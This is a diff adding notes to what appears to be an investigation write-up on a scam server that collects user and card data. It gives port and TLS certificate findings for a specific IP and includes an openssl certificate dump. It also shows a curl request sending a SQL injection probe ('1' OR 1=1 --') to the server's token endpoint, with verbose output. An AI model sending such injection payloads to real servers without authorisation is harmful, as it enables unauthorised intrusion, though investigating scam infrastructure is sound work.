@@ -273,6 +273,73 @@ Nmap done: 1 IP address (1 host up) scanned in 2379.93 seconds
 
 ```
 
+Interesting:
+
+```bash
+# Host: 102.165.14.4
+
+## Ports:
+- 5000/tcp: HTTP (TwistedWeb 24.3.0)
+- 5001/tcp: HTTPS (TwistedWeb 24.3.0)
+
+## Cert on :5001:
+- CN: telegrambotcheck.duckdns.org
+- SAN: telegrambotcheck.duckdns.org
+- Issuer: Let's Encrypt
+- Valid: May–Aug 2025
+```
+> using some magic openssl I gather the tls cert and the details, but not much can be made from it. I wonder if authorities can trace the telegram bot
+
+Cert Dump `openssl s_client -connect 102.165.14.4:5001 </dev/null \
+  | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' \
+  > telegrambotcheck.crt`
+  
+  -> [Cert](evidence/telegrambotcheck.crt) 
+  > Read with `openssl x509 -in telegrambotcheck.crt -noout -text`
+
+Interesting interaction:
+
+```bash
+curl -vk -X POST "https://102.165.14.4:5001/receive_token?referrer=loco" \
+  -d "token=1' OR 1=1 --"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 102.165.14.4:5001...
+* Connected to 102.165.14.4 (102.165.14.4) port 5001
+* ALPN: curl offers h2,http/1.1
+* (304) (OUT), TLS handshake, Client hello (1):
+* (304) (IN), TLS handshake, Server hello (2):
+* (304) (IN), TLS handshake, Unknown (8):
+* (304) (IN), TLS handshake, Certificate (11):
+* (304) (IN), TLS handshake, CERT verify (15):
+* (304) (IN), TLS handshake, Finished (20):
+* (304) (OUT), TLS handshake, Finished (20):
+* SSL connection using TLSv1.3 / AEAD-CHACHA20-POLY1305-SHA256 / [blank] / UNDEF
+* ALPN: server accepted http/1.1
+* Server certificate:
+*  subject: CN=telegrambotcheck.duckdns.org
+*  start date: May  5 01:49:29 2025 GMT
+*  expire date: Aug  3 01:49:28 2025 GMT
+*  issuer: C=US; O=Let's Encrypt; CN=E6
+*  SSL certificate verify ok.
+* using HTTP/1.x
+> POST /receive_token?referrer=loco HTTP/1.1
+> Host: 102.165.14.4:5001
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Content-Length: 18
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 18 bytes
+< HTTP/1.1 200 OK
+< Server: TwistedWeb/24.3.0
+< Date: Wed, 30 Jul 2025 14:04:37 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 34
+<
+* Connection #0 to host 102.165.14.4 left intact
+Invalid token or missing referrer.%
+```
+
 They gather user data, then ask for card details.
 
 They do not validate inputs, Card details are not validated.  
